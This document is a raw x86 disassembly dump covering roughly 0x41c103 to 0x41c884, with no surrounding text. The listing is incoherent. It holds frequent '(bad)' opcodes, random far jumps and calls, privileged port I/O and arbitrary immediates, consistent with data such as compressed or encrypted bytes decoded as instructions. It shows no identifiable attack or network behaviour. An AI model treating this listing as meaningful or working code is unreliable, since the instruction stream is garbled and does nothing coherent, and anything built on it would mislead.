  41c103:	das    
  41c104:	inc    eax
  41c105:	loope  0x41c10b
  41c107:	dec    esp
  41c108:	mov    esi,DWORD PTR [ebx+0x42]
  41c10b:	and    dh,BYTE PTR [ebx-0x74]
  41c10e:	mov    eax,0x7745f8a3
  41c113:	stc    
  41c114:	outs   dx,DWORD PTR ds:[esi]
  41c115:	push   ebx
  41c116:	mov    eax,ds:0x4fb9f177
  41c11b:	adc    eax,0xf57d4fbf
  41c120:	loope  0x41c101
  41c122:	fsub   QWORD PTR [ebx]
  41c124:	(bad)  
  41c125:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c126:	fisttp WORD PTR [ebx]
  41c128:	in     al,dx
  41c129:	inc    ecx
  41c12a:	gs add al,0xc
  41c12d:	fld    DWORD PTR [ebp+0x4bd25fe6]
  41c133:	lock dec edx
  41c135:	cmc    
  41c136:	leave  
  41c137:	pop    ebx
  41c138:	cmp    ecx,DWORD PTR [ebx+0x2885a476]
  41c13e:	(bad)  
  41c13f:	sbb    esp,eax
  41c141:	lods   al,BYTE PTR ds:[esi]
  41c142:	mov    bl,0xf2
  41c144:	jge    0x41c1a9
  41c146:	inc    esp
  41c147:	fwait
  41c148:	mov    dh,0x1a
  41c14a:	push   cs
  41c14b:	add    BYTE PTR [esi],bl
  41c14d:	dec    eax
  41c14e:	mov    esi,0x3535ad74
  41c153:	sub    eax,0xdadbd03a
  41c158:	add    eax,0xf6bd2ea
  41c15d:	mov    fs,WORD PTR [edi-0x3f121f0d]
  41c163:	data16 aam 0xf2
  41c166:	xor    bh,cl
  41c168:	sbb    esi,edx
  41c16a:	test   eax,0x761b91e1
  41c16f:	(bad)
  41c173:	iret   
  41c174:	adc    ebp,edi
  41c176:	push   eax
  41c177:	mov    edi,0xf7da70f7
  41c17c:	cwd    
  41c17e:	ret    0x7589
  41c181:	loope  0x41c17a
  41c183:	cmp    eax,0xf7f73a2b
  41c188:	test   eax,0xca6f154f
  41c18d:	add    esp,0xbca9f25
  41c193:	mov    ebp,0xb33af4ef
  41c198:	(bad)
  41c19b:	jbe    0x41c1f4
  41c19d:	push   0x5b1df6ef
  41c1a2:	in     eax,0xd6
  41c1a4:	(bad)  
  41c1a5:	stos   BYTE PTR es:[edi],al
  41c1a6:	or     esi,DWORD PTR [ecx+0x72858352]
  41c1ac:	(bad)  
  41c1ad:	not    ah
  41c1af:	xchg   edi,eax
  41c1b0:	pop    ds
  41c1b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1b2:	dec    ecx
  41c1b3:	fnstenv [ebx-0x25a5880e]
  41c1b9:	jno    0x41c16a
  41c1bb:	mov    bh,0x57
  41c1bd:	lahf   
  41c1be:	lods   al,BYTE PTR es:[esi]
  41c1c0:	sahf   
  41c1c1:	aas    
  41c1c2:	retf   0xb545
  41c1c5:	xchg   ebx,eax
  41c1c6:	ret    
  41c1c7:	aaa    
  41c1c8:	imul   esp,DWORD PTR [ebx+0xc],0xffffff88
  41c1cc:	inc    ecx
  41c1cd:	and    BYTE PTR [edx],cl
  41c1cf:	out    dx,al
  41c1d0:	rcl    dl,cl
  41c1d2:	cmp    ch,ah
  41c1d4:	xor    al,0x95
  41c1d6:	neg    DWORD PTR [eax+edx*1]
  41c1d9:	jl     0x41c1fd
  41c1db:	push   ss
  41c1dc:	shr    DWORD PTR [esi+esi*4+0x1e755934],0x8b
  41c1e4:	aad    0x5f
  41c1e6:	xchg   DWORD PTR [eax-0x6de3ea12],ebx
  41c1ec:	inc    ecx
  41c1ed:	out    dx,eax
  41c1ee:	leave  
  41c1ef:	ret    0xcb6b
  41c1f2:	xchg   ebx,eax
  41c1f3:	lock or DWORD PTR ds:0x9aaaf2db,esi
  41c1fa:	loopne 0x41c270
  41c1fc:	pop    esp
  41c1fd:	push   esi
  41c1fe:	outs   dx,DWORD PTR ds:[esi]
  41c1ff:	outs   dx,BYTE PTR ds:[esi]
  41c200:	dec    ebx
  41c201:	pushf  
  41c202:	aad    0xd1
  41c204:	xchg   ebx,eax
  41c205:	sub    eax,DWORD PTR [ebp+0x65749c15]
  41c20b:	shl    DWORD PTR [edi+0x1f],0x81
  41c20f:	cmp    eax,0xecadae22
  41c214:	jmp    0x41c1f0
  41c216:	jge    0x41c1f2
  41c218:	cwde   
  41c219:	arpl   WORD PTR [edi],bx
  41c21b:	push   edx
  41c21c:	sub    esi,edi
  41c21e:	ror    DWORD PTR [eax+0x37],0x7e
  41c222:	cld    
  41c223:	sub    bl,BYTE PTR [eax-0x1a]
  41c226:	jbe    0x41c25f
  41c228:	dec    ebx
  41c229:	cmp    ebp,DWORD PTR [ebp-0x57]
  41c22c:	in     al,0xfa
  41c22e:	ins    BYTE PTR es:[edi],dx
  41c22f:	push   0xffffff9d
  41c231:	push   cs
  41c232:	shr    dh,1
  41c234:	jp     0x41c1ba
  41c236:	or     ecx,DWORD PTR [edx+0x7f]
  41c239:	jne    0x41c274
  41c23b:	dec    ecx
  41c23c:	sbb    DWORD PTR [eax*1-0x597ee5d6],esi
  41c243:	sub    al,0xde
  41c245:	mov    al,ds:0xa5fa6faf
  41c24a:	aad    0x72
  41c24c:	lods   al,BYTE PTR ds:[esi]
  41c24d:	call   0x4e3c479c
  41c252:	sti    
  41c253:	mov    DWORD PTR [ebp+0x75b41dc8],ebp
  41c259:	cmp    BYTE PTR [edi+0x3b4f8970],ah
  41c25f:	fwait
  41c260:	rcl    dh,cl
  41c262:	pop    ebx
  41c263:	adc    ch,dl
  41c265:	or     BYTE PTR [ecx+0x49f1d439],al
  41c26b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c26c:	into   
  41c26d:	xchg   edi,eax
  41c26e:	add    DWORD PTR [ecx-0x72],0xbe7995d4
  41c275:	out    dx,eax
  41c276:	inc    ecx
  41c277:	and    DWORD PTR [esi-0x23bee2f7],edx
  41c27d:	mov    ch,0x6c
  41c27f:	lds    esp,FWORD PTR [edx-0x475989cd]
  41c285:	ja     0x41c303
  41c287:	imul   ebp,ebp,0xa30a73b8
  41c28d:	add    al,0xa3
  41c28f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c290:	or     eax,DWORD PTR [ecx-0x6d]
  41c293:	mov    bh,0xc2
  41c295:	loopne 0x41c292
  41c297:	xlat   BYTE PTR ds:[ebx]
  41c298:	clc    
  41c299:	push   es
  41c29a:	inc    edi
  41c29b:	pusha  
  41c29c:	sub    eax,0x1887203b
  41c2a1:	(bad)  
  41c2a2:	outs   dx,BYTE PTR ds:[esi]
  41c2a3:	aad    0xa2
  41c2a5:	ins    BYTE PTR es:[edi],dx
  41c2a6:	stos   BYTE PTR es:[edi],al
  41c2a7:	mov    ah,dh
  41c2a9:	adc    al,0x85
  41c2ab:	or     DWORD PTR [edi],edi
  41c2ad:	mul    bl
  41c2af:	fdiv   DWORD PTR [edi+0x60bf190f]
  41c2b5:	mov    BYTE PTR [ebx+edi*2],ch
  41c2b8:	sbb    al,0xe8
  41c2ba:	stc    
  41c2bb:	sahf   
  41c2bc:	push   edi
  41c2bd:	(bad)  
  41c2be:	pusha  
  41c2bf:	add    eax,0x4be39c35
  41c2c4:	jle    0x41c2b2
  41c2c6:	repz mov ebp,es
  41c2c9:	fwait
  41c2ca:	and    dh,cl
  41c2cc:	dec    esi
  41c2cd:	mov    ds:0x1897469,eax
  41c2d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2d3:	inc    edx
  41c2d4:	mov    cl,0x46
  41c2d6:	push   ss
  41c2d7:	push   esp
  41c2d8:	mov    ecx,0xa6477896
  41c2dd:	cmp    BYTE PTR [edx+ecx*8],al
  41c2e0:	dec    ebp
  41c2e1:	mov    dl,0x78
  41c2e3:	mov    DWORD PTR [ebx+0x3d509b59],ebp
  41c2e9:	xchg   esp,ebx
  41c2eb:	cmp    eax,0xe5075518
  41c2f0:	fs dec ebp
  41c2f2:	push   edx
  41c2f3:	mov    DWORD PTR [ebx],ebx
  41c2f5:	inc    edi
  41c2f6:	sub    eax,0x570336ea
  41c2fb:	jge    0x41c2a4
  41c2fd:	(bad)  
  41c2fe:	pusha  
  41c2ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c300:	outs   dx,DWORD PTR ds:[esi]
  41c301:	popa   
  41c302:	jno    0x41c366
  41c304:	xor    DWORD PTR [edi+0x1e],eax
  41c307:	sub    BYTE PTR [ebx+0x2f513ab6],dh
  41c30d:	retf   
  41c30e:	jg     0x41c294
  41c310:	mov    ds:0x6bfc5ded,eax
  41c315:	push   edx
  41c316:	stc    
  41c317:	mov    esp,0xb718cf4a
  41c31c:	xchg   esi,eax
  41c31d:	arpl   dx,bp
  41c31f:	dec    ecx
  41c320:	test   al,0xc2
  41c322:	leave  
  41c323:	mov    es,WORD PTR [edx]
  41c325:	sub    BYTE PTR ds:0xb726285,0xb1
  41c32c:	aam    0xd6
  41c32e:	sbb    ebp,eax
  41c330:	mov    ah,0x98
  41c332:	cmp    ah,BYTE PTR [ecx]
  41c334:	push   0x75e0879
  41c339:	lea    eax,[ebp-0x6bf6ed10]
  41c33f:	xchg   edi,eax
  41c340:	and    esi,DWORD PTR [ecx+edi*2]
  41c343:	jae    0x41c2db
  41c345:	in     eax,0xa7
  41c347:	pop    edi
  41c348:	mov    ecx,0x5e0c5f2
  41c34d:	xor    ax,0xbc21
  41c351:	adc    eax,0x85a7d9ce
  41c356:	mov    ebp,0x4307d738
  41c35b:	outs   dx,DWORD PTR ds:[esi]
  41c35c:	in     al,0x89
  41c35e:	outs   dx,DWORD PTR ds:[esi]
  41c35f:	push   ds
  41c360:	xchg   sp,ax
  41c362:	popf   
  41c363:	lock jbe 0x41c333
  41c366:	or     edi,DWORD PTR [ebx]
  41c368:	or     BYTE PTR [esi-0x6a],ah
  41c36b:	aam    0x1a
  41c36d:	mov    al,ds:0xe3d90403
  41c372:	push   0xffffffb4
  41c374:	jg     0x41c37d
  41c376:	daa    
  41c377:	sbb    al,0xfd
  41c379:	xor    BYTE PTR [esi],dh
  41c37b:	adc    DWORD PTR [edi+0x20778eaf],ecx
  41c381:	je     0x41c376
  41c383:	rcl    ah,1
  41c385:	add    al,0xb6
  41c387:	sbb    DWORD PTR [eax+esi*4+0x3a],eax
  41c38b:	aas    
  41c38c:	mov    edx,0x10092d3a
  41c391:	push   ebp
  41c392:	(bad)  
  41c393:	rol    edi,0xe4
  41c396:	mov    fs,eax
  41c398:	stos   BYTE PTR es:[edi],al
  41c399:	(bad)  
  41c39a:	mov    WORD PTR [ebp+0x59],gs
  41c39d:	push   ds
  41c39e:	jl     0x41c3b7
  41c3a0:	jecxz  0x41c3ba
  41c3a2:	pop    esi
  41c3a3:	xor    DWORD PTR [ebx+0x49],ebp
  41c3a6:	and    BYTE PTR [esi+ebp*4+0x481c6a6b],ch
  41c3ad:	out    dx,eax
  41c3ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3b0:	push   ss
  41c3b1:	inc    edx
  41c3b2:	scas   al,BYTE PTR es:[edi]
  41c3b3:	(bad)  
  41c3b5:	test   DWORD PTR [edx+eiz*4-0x5c2c6086],0xc6592926
  41c3c0:	or     ah,BYTE PTR [edx]
  41c3c2:	mov    dl,0xc
  41c3c4:	int    0x2c
  41c3c6:	adc    DWORD PTR fs:[ebx-0x5aba70bb],esp
  41c3cd:	shr    DWORD PTR [ecx+0x41],0xf2
  41c3d1:	test   DWORD PTR [eax-0x1558d62b],eax
  41c3d7:	adc    BYTE PTR [ebx-0x59b186f5],dl
  41c3dd:	inc    edx
  41c3de:	and    eax,0x61739956
  41c3e3:	gs jmp 0x2fd6:0xa84f5882
  41c3eb:	xor    BYTE PTR [edi-0x51],ch
  41c3ee:	arpl   WORD PTR [edi],sp
  41c3f0:	dec    eax
  41c3f1:	push   ss
  41c3f2:	sbb    BYTE PTR [ecx+0x4bde8b60],dh
  41c3f8:	fcom   QWORD PTR [eax+0x31]
  41c3fb:	ss daa 
  41c3fd:	fadd   QWORD PTR [edx+ebx*2+0x1a]
  41c401:	(bad)  
  41c402:	mov    eax,ds:0x45c75758
  41c407:	nop
  41c408:	and    eax,0xb26d69c
  41c40d:	pusha  
  41c40e:	lea    esp,[esi-0x5]
  41c411:	das    
  41c412:	mov    ecx,0x47baef51
  41c417:	mov    cl,0xc8
  41c419:	dec    edi
  41c41a:	hlt    
  41c41b:	(bad)  
  41c41c:	pop    eax
  41c41d:	ja     0x41c3e7
  41c41f:	sbb    DWORD PTR [edi+0x64f0b859],0xf
  41c426:	cmp    edi,esp
  41c428:	xchg   BYTE PTR [edx+0x26eed9cf],bh
  41c42e:	jns    0x41c4a6
  41c430:	fistp  WORD PTR [ebx]
  41c432:	and    bh,dh
  41c434:	arpl   WORD PTR [esi],sp
  41c436:	mov    bl,0xb1
  41c438:	sub    ecx,eax
  41c43a:	mov    edi,0x83c96d5b
  41c43f:	cmp    al,0x31
  41c441:	push   0xffffff8a
  41c443:	jge    0x41c45a
  41c445:	cdq    
  41c446:	in     al,0x65
  41c448:	sar    BYTE PTR [ebx+0x1e],cl
  41c44b:	sub    bh,0x82
  41c44e:	push   0x979890e1
  41c453:	stos   BYTE PTR es:[edi],al
  41c454:	das    
  41c455:	(bad)  
  41c457:	sbb    ah,dh
  41c459:	and    esi,ebx
  41c45b:	fwait
  41c45c:	out    dx,eax
  41c45d:	xchg   ebx,eax
  41c45e:	fld    DWORD PTR [edi]
  41c460:	cmp    edx,DWORD PTR [ecx]
  41c462:	(bad)  
  41c463:	push   edx
  41c464:	repnz das 
  41c466:	fwait
  41c467:	mov    dh,0x8d
  41c469:	ja     0x41c442
  41c46b:	test   al,0xae
  41c46d:	sti    
  41c46e:	addr16 popf 
  41c470:	dec    ebp
  41c471:	push   eax
  41c472:	push   0xbf81d6
  41c477:	push   edx
  41c478:	jmp    0x41c46e
  41c47a:	das    
  41c47b:	or     DWORD PTR [ebx+0x63],0xdd110084
  41c482:	adc    bl,BYTE PTR [eax-0x351c2e0b]
  41c488:	adc    BYTE PTR [edx],0x28
  41c48b:	adc    al,0x2c
  41c48d:	mov    esi,0x1600d182
  41c492:	dec    ecx
  41c493:	pop    es
  41c494:	(bad)  
  41c495:	mov    ecx,0x28e3fa0d
  41c49a:	ret    
  41c49b:	stos   DWORD PTR es:[edi],eax
  41c49c:	ins    DWORD PTR es:[edi],dx
  41c49d:	ret    
  41c49e:	das    
  41c49f:	sbb    edi,edx
  41c4a1:	xchg   edi,eax
  41c4a2:	mov    ebx,0x9b36992
  41c4a7:	sbb    ecx,DWORD PTR [ecx-0x67]
  41c4aa:	aaa    
  41c4ab:	rcr    DWORD PTR [ecx+0x4193991],cl
  41c4b1:	jbe    0x41c442
  41c4b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4b4:	call   0x414dd5
  41c4b9:	jmp    0x41c888
  41c4be:	inc    edi
  41c4bf:	and    edi,DWORD PTR [eax]
  41c4c1:	sbb    DWORD PTR [ebx+eax*1],esi
  41c4c4:	daa    
  41c4c5:	and    cl,BYTE PTR [ebx]
  41c4c7:	cdq    
  41c4c8:	lahf   
  41c4c9:	jo     0x41c46c
  41c4cb:	dec    edi
  41c4cc:	imul   BYTE PTR [edx+0x4a]
  41c4cf:	jae    0x41c4e7
  41c4d1:	sbb    BYTE PTR [edx+edx*1+0x45f1818],bh
  41c4d8:	xchg   ebx,eax
  41c4d9:	sub    BYTE PTR [eax-0x4a24d00e],dh
  41c4df:	ret    0xb7b5
  41c4e2:	push   ss
  41c4e3:	push   cs
  41c4e4:	call   0x1f6d:0x142a4154
  41c4eb:	ret    0x6a3a
  41c4ee:	mov    esi,0x5a782f9d
  41c4f3:	cmp    eax,0x39c0cf51
  41c4f8:	jl     0x41c4cc
  41c4fa:	jb     0x41c563
  41c4fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4fd:	mov    eax,0x46487515
  41c502:	mov    ds:0xedaaa93c,al
  41c507:	xor    DWORD PTR [esi+0x1f0e3f25],0x9e9ca1a3
  41c511:	arpl   cx,si
  41c513:	repnz add BYTE PTR [edx+0x547b2849],0x10
  41c51b:	popa   
  41c51c:	mov    bl,0xcc
  41c51e:	sbb    esi,esp
  41c520:	daa    
  41c521:	sahf   
  41c522:	or     bh,BYTE PTR [ebp-0x30819e79]
  41c528:	inc    ebp
  41c529:	sub    edx,DWORD PTR [eax+0x6620c0b]
  41c52f:	and    DWORD PTR [ebx],eax
  41c531:	add    DWORD PTR [eax+0x5c],edi
  41c534:	add    al,0x4e
  41c536:	xor    ah,al
  41c538:	push   eax
  41c539:	jl     0x41c536
  41c53b:	cwde   
  41c53c:	cdq    
  41c53d:	mov    dl,0xfd
  41c53f:	and    ch,dh
  41c541:	inc    edi
  41c542:	sub    ebx,edx
  41c544:	scas   al,BYTE PTR es:[edi]
  41c545:	rcr    DWORD PTR [ebx*1-0x2f04f3f7],cl
  41c54c:	call   0xa725bbf8
  41c551:	add    dh,bl
  41c553:	add    al,0xf3
  41c555:	aaa    
  41c556:	inc    eax
  41c557:	jmp    0x6c848e34
  41c55c:	and    edi,DWORD PTR [edx-0x78]
  41c55f:	pop    ebx
  41c560:	imul   edx,DWORD PTR [ecx+0x7cb1beee],0x4d
  41c567:	xchg   ecx,eax
  41c568:	push   0x42
  41c56a:	mov    ch,0xfe
  41c56c:	rcl    BYTE PTR [ebx+0x24],cl
  41c56f:	loop   0x41c596
  41c571:	(bad)  
  41c573:	push   DWORD PTR [edx]
  41c575:	xchg   ebp,eax
  41c576:	sbb    eax,0x78cbb26e
  41c57b:	pushf  
  41c57c:	sbb    BYTE PTR [eax+0x52b76f0],0xcf
  41c583:	in     eax,dx
  41c584:	aam    0x22
  41c586:	sub    al,0x4b
  41c588:	je     0x41c5bc
  41c58a:	sub    DWORD PTR [esi-0x2b],0xca2cdbf4
  41c591:	dec    edx
  41c592:	aad    0xe8
  41c594:	adc    esp,esp
  41c596:	in     al,0xe8
  41c598:	sahf   
  41c599:	mov    al,0x27
  41c59b:	je     0x41c611
  41c59d:	ds out 0x3,eax
  41c5a0:	cmp    BYTE PTR [esi],0x3a
  41c5a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5a4:	jmp    0x41c53a
  41c5a6:	fstp   st(0)
  41c5a8:	mov    ebp,0x7f9c2f39
  41c5ad:	adc    BYTE PTR [ebx],cl
  41c5af:	dec    ebx
  41c5b0:	dec    ebp
  41c5b1:	mov    al,0xd5
  41c5b3:	push   eax
  41c5b4:	inc    eax
  41c5b5:	mov    ss,ebp
  41c5b7:	adc    ch,BYTE PTR [esi+edi*4-0x5407eca7]
  41c5be:	das    
  41c5bf:	xchg   edi,eax
  41c5c0:	sar    BYTE PTR [esi+0x3ef6e93b],0x5f
  41c5c7:	ss pop es
  41c5c9:	cwde   
  41c5ca:	scas   al,BYTE PTR es:[edi]
  41c5cb:	scas   eax,DWORD PTR es:[edi]
  41c5cc:	lea    esp,[eax+0x342a4c30]
  41c5d2:	mov    ch,0x86
  41c5d4:	jmp    0xa219353f
  41c5d9:	add    al,0x90
  41c5db:	daa    
  41c5dc:	xchg   ecx,eax
  41c5dd:	aaa    
  41c5de:	out    dx,eax
  41c5df:	imul   ecx,DWORD PTR [edi+ecx*4],0xb6b4cba4
  41c5e6:	mov    esi,0xb77ce971
  41c5eb:	repz shl DWORD PTR [esi+0x52],1
  41c5ef:	pop    esp
  41c5f0:	pop    esi
  41c5f1:	xchg   ebx,eax
  41c5f2:	inc    ebx
  41c5f3:	cdq    
  41c5f4:	add    edi,DWORD PTR [ecx+esi*2]
  41c5f7:	mov    ebp,DWORD PTR [ebp+0x4b]
  41c5fa:	(bad)  [edx]
  41c5fc:	in     al,0x7f
  41c5fe:	mov    dl,0x41
  41c600:	inc    edx
  41c601:	cmp    cl,BYTE PTR [esi+0x3a]
  41c604:	mov    esp,0xa8cb8526
  41c609:	not    ch
  41c60b:	xor    al,0xc0
  41c60d:	mov    cl,0x2e
  41c60f:	mov    dl,0x46
  41c611:	(bad)  
  41c612:	das    
  41c613:	in     al,dx
  41c614:	aad    0x70
  41c616:	add    DWORD PTR [ecx-0x1d],esi
  41c619:	leave  
  41c61a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c61b:	mov    eax,0x6de1c87
  41c620:	mul    DWORD PTR [esi-0x1c8ff47b]
  41c626:	cmp    edi,esp
  41c628:	inc    ebp
  41c629:	jp     0x41c5da
  41c62b:	or     al,0x7e
  41c62d:	out    0x56,al
  41c62f:	jle    0x41c61b
  41c631:	mov    ebp,0x5f183cd4
  41c636:	inc    esp
  41c637:	jae    0x41c61d
  41c639:	mov    ds:0xf2b7078f,eax
  41c63e:	div    esi
  41c640:	push   ebx
  41c641:	mov    ah,0x87
  41c643:	mov    ch,0xb4
  41c645:	test   eax,0x668de844
  41c64a:	mov    al,0x45
  41c64c:	out    0x11,eax
  41c64e:	loopne 0x41c6af
  41c650:	shr    BYTE PTR [edx+0x31],1
  41c653:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c654:	sub    eax,0x6ec0b460
  41c659:	fcom   QWORD PTR [eax+eiz*8]
  41c65c:	test   dh,ah
  41c65e:	mov    ds:0x84c2b2c1,al
  41c663:	sti    
  41c664:	add    eax,0x8c8c332e
  41c669:	sti    
  41c66a:	mov    ds:0x7cca9a01,eax
  41c66f:	cmp    al,0xe0
  41c671:	push   esp
  41c672:	xlat   BYTE PTR ds:[ebx]
  41c673:	addr16 in eax,dx
  41c675:	ss es push eax
  41c678:	lds    edx,FWORD PTR [ecx+edi*2-0x5a]
  41c67c:	mov    eax,0x435c65b8
  41c681:	(bad)  
  41c683:	sahf   
  41c684:	lahf   
  41c685:	stos   BYTE PTR es:[edi],al
  41c686:	mov    bl,0x97
  41c688:	adc    ah,BYTE PTR [edi-0x5e]
  41c68b:	jnp    0x41c686
  41c68d:	mov    ds:0xb94d511b,al
  41c692:	test   eax,0xad82842b
  41c697:	repnz les esp,FWORD PTR [eax-0x34]
  41c69b:	(bad)  
  41c69c:	iret   
  41c69d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c69e:	dec    ebp
  41c69f:	add    edx,esp
  41c6a1:	retf   
  41c6a2:	call   0x9f04c5ea
  41c6a7:	cmp    eax,edx
  41c6a9:	pop    edx
  41c6aa:	xlat   BYTE PTR ds:[ebx]
  41c6ab:	add    eax,0xe459895f
  41c6b0:	inc    eax
  41c6b1:	xor    eax,0xb7ccd7cb
  41c6b6:	inc    edi
  41c6b7:	push   edx
  41c6b8:	mov    gs,WORD PTR [edi]
  41c6ba:	aad    0x8a
  41c6bc:	dec    ecx
  41c6bd:	mov    BYTE PTR [eax-0x36003330],cl
  41c6c3:	pop    esi
  41c6c5:	jbe    0x41c65a
  41c6c7:	pop    eax
  41c6c8:	sub    DWORD PTR [esi],0x96acb85c
  41c6ce:	mov    cl,0x6b
  41c6d0:	scas   al,BYTE PTR es:[edi]
  41c6d1:	and    eax,0xe8fc1dd6
  41c6d6:	and    DWORD PTR [ecx],ecx
  41c6d8:	stos   BYTE PTR es:[edi],al
  41c6d9:	ror    DWORD PTR [eax-0x77],1
  41c6dc:	adc    al,0x64
  41c6de:	imul   edx,DWORD PTR [ebp-0x68],0xaa8bfe88
  41c6e5:	xchg   edx,eax
  41c6e6:	cld    
  41c6e7:	adc    ch,BYTE PTR ds:0xe4d5e518
  41c6ed:	popf   
  41c6ee:	or     ebp,DWORD PTR [edx-0x573ddaa1]
  41c6f4:	push   ebp
  41c6f5:	or     al,0x17
  41c6f7:	fild   QWORD PTR ds:0xcfe9afb6
  41c6fd:	or     ch,BYTE PTR [edx-0x8]
  41c700:	jmp    0x41c685
  41c702:	imul   eax,edi,0xc97e532d
  41c708:	das    
  41c709:	dec    ebp
  41c70a:	ds push ds
  41c70c:	je     0x41c76f
  41c70e:	into   
  41c70f:	jns    0x41c73b
  41c711:	inc    edi
  41c712:	mov    ebp,0xa9756d1
  41c717:	xor    dl,BYTE PTR [ebx-0x763026ce]
  41c71d:	jns    0x41c74c
  41c71f:	sbb    BYTE PTR [edx-0x37],al
  41c722:	daa    
  41c723:	mov    BYTE PTR [esi],0xf3
  41c726:	aas    
  41c727:	and    ch,bl
  41c729:	popa   
  41c72a:	lds    eax,FWORD PTR [ebp-0x6b70b12d]
  41c730:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c731:	dec    eax
  41c732:	int    0x69
  41c734:	xor    DWORD PTR [edx-0x43],edx
  41c737:	adc    DWORD PTR [ecx-0x138d4591],esp
  41c73d:	and    DWORD PTR [edi],esi
  41c73f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c740:	mov    dl,0x54
  41c742:	push   ds
  41c743:	pop    edx
  41c744:	jmp    0x4412:0x19a2480f
  41c74b:	inc    ecx
  41c74c:	mov    edi,ecx
  41c74e:	fwait
  41c74f:	out    dx,al
  41c750:	mov    dh,0x35
  41c752:	jo     0x41c740
  41c754:	mov    edx,0x875d37ab
  41c75a:	pop    eax
  41c75b:	mov    dh,0x7c
  41c75d:	shl    DWORD PTR [edx+eax*2-0xf],cl
  41c761:	cmp    al,0x53
  41c763:	or     al,0xbf
  41c765:	mov    DWORD PTR [eax],0xd83f2253
  41c76b:	popa   
  41c76c:	mov    eax,ds:0xfbe7d0da
  41c771:	add    ah,BYTE PTR [ebx+edi*2+0x23e7b493]
  41c778:	fst    QWORD PTR [esi]
  41c77a:	and    eax,0xf6fa6ae4
  41c77f:	shl    BYTE PTR [edx+ebx*8-0x70],1
  41c783:	mov    ecx,0x5a3a49f9
  41c788:	jb     0x41c778
  41c78a:	ins    BYTE PTR es:[edi],dx
  41c78b:	pop    esi
  41c78c:	jg     0x41c721
  41c78e:	jmp    0xaa55371f
  41c793:	int    0x10
  41c795:	push   edi
  41c796:	data16 jle 0x41c807
  41c799:	adc    eax,0x20e4da5c
  41c79e:	retf   
  41c79f:	jg     0x41c819
  41c7a1:	(bad)  
  41c7a2:	push   ds
  41c7a3:	push   ecx
  41c7a4:	xlat   BYTE PTR ds:[ebx]
  41c7a5:	xor    BYTE PTR [edx+edx*2+0x1],ah
  41c7a9:	cli    
  41c7aa:	test   eax,0x5e0ad83
  41c7af:	dec    ebp
  41c7b0:	pusha  
  41c7b1:	jns    0x41c7d4
  41c7b3:	inc    edi
  41c7b4:	pop    ecx
  41c7b5:	mov    ds:0xa8fdb8bc,eax
  41c7ba:	mov    ebx,0x49f15565
  41c7bf:	jae    0x41c7b5
  41c7c1:	fs aad 0xe
  41c7c4:	retf   0x43cc
  41c7c7:	ja     0x41c791
  41c7c9:	mov    edi,0xa3e10974
  41c7ce:	xchg   ebp,eax
  41c7cf:	pop    edi
  41c7d0:	test   cl,dh
  41c7d2:	das    
  41c7d3:	stos   DWORD PTR es:[edi],eax
  41c7d4:	ja     0x41c833
  41c7d6:	imul   eax,DWORD PTR [ecx+0xf],0xffffff9f
  41c7da:	or     edx,ebx
  41c7dc:	rol    DWORD PTR [ecx+0x7067d717],cl
  41c7e2:	push   cs
  41c7e3:	push   esi
  41c7e4:	pop    esp
  41c7e5:	pop    esp
  41c7e6:	shl    cl,1
  41c7e8:	in     al,0x8d
  41c7ea:	shr    DWORD PTR [edx],0xfa
  41c7ed:	(bad)
  41c7f1:	jecxz  0x41c80c
  41c7f3:	in     eax,dx
  41c7f4:	sbb    BYTE PTR [eax+ebx*8+0x7e],bl
  41c7f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7f9:	enter  0xb1a8,0x47
  41c7fd:	aad    0xc3
  41c7ff:	cmc    
  41c800:	xchg   eax,esp
  41c802:	mov    al,0xeb
  41c804:	and    eax,DWORD PTR [ebp+0x35a6fd43]
  41c80a:	shl    DWORD PTR [ebx+ebx*1+0x59],0x46
  41c80f:	fmul   st(5),st
  41c811:	mov    cl,0xf1
  41c813:	mov    ebx,0x421ea00f
  41c818:	test   dl,dh
  41c81a:	jb     0x41c871
  41c81c:	add    esi,DWORD PTR [edi-0x63]
  41c81f:	in     eax,0xd9
  41c821:	mov    eax,0x603074bb
  41c826:	and    ch,BYTE PTR [ecx]
  41c828:	test   BYTE PTR [edi],bl
  41c82a:	mov    eax,ds:0xdb9d34da
  41c82f:	pop    ecx
  41c830:	sbb    edx,ecx
  41c832:	les    ebp,FWORD PTR [edx]
  41c834:	push   ebx
  41c835:	pop    ss
  41c836:	cwde   
  41c837:	sub    BYTE PTR [ecx+0x4d],dl
  41c83a:	sub    al,0xb7
  41c83c:	dec    esi
  41c83d:	mov    cs,WORD PTR [edx+0x9352827]
  41c843:	mov    ah,BYTE PTR [esi]
  41c845:	lods   al,BYTE PTR ds:[esi]
  41c846:	aaa    
  41c847:	lods   al,BYTE PTR ds:[esi]
  41c849:	inc    edx
  41c84a:	mov    bh,0x18
  41c84c:	int3   
  41c84d:	push   edx
  41c84e:	sbb    eax,0xb64893c0
  41c853:	mov    gs,esp
  41c855:	iret   
  41c856:	(bad)  
  41c857:	push   eax
  41c858:	sbb    edi,DWORD PTR [ecx-0x71]
  41c85b:	cmp    eax,DWORD PTR [esi]
  41c85d:	sbb    dl,BYTE PTR ds:0xd7696120
  41c863:	jmp    0x49e0:0xa3162e49
  41c86a:	aam    0x80
  41c86c:	sub    eax,0x5c08fd88
  41c871:	mov    esi,0x61282b67
  41c876:	adc    bl,BYTE PTR [edx]
  41c878:	loop   0x41c8da
  41c87a:	out    0x31,eax
  41c87c:	fdiv   DWORD PTR [eax]
  41c87e:	outs   dx,BYTE PTR ds:[esi]
  41c87f:	pusha  
  41c880:	ret    0x4788
  41c883:	push   ebp
  41c884:	push   ss
